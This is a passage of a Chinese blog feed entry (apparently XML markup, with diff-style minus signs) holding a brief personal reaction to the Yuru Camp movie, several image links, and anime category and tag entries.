-<h1 id="延续与改变"><a href="#延续与改变" class="headerlink" title="延续与改变"></a>延续与改变</h1><p>氛围还是那个氛围，舒服呀~<br>整部电影虽有起伏，但幸好波动没那么大，让我的小心脏尚能承受。<br>延续了搖曳露营TV动画的风格，舒缓的音乐，柔和的氛围。里面的人物性格都和她们高中的时候差不多，是熟悉的感觉。<br>今晚还没想好怎么写，净写些口水话，算了，明天写吧。先放几张图上来。<br><img src="/images/yuru3.png" alt="搖曳露营"><br><img src="/images/%E5%87%9B+%E6%8A%9A%E5%AD%907.png" alt="搖曳露营"><br><img src="/images/%E6%8A%9A%E5%AD%902.png" alt="搖曳露营"><br><img src="/images/%E7%8A%AC%E5%B1%B1%E8%91%B52.png" alt="搖曳露营"><br><img src="/images/%E5%BF%97%E6%91%A9%E5%87%9B5.png" alt="搖曳露营"><br><img src="/images/%E5%BF%97%E6%91%A9%E5%87%9B6.png" alt="搖曳露营"></p>
-]]></content>
-      <categories>
-        <category>动画</category>
-        <category>搖曳露营</category>
-      </categories>
-      <tags>
-        <tag>动画</tag>
-        <tag>搖曳露营</tag>
       </tags>
   </entry>
   <entry>
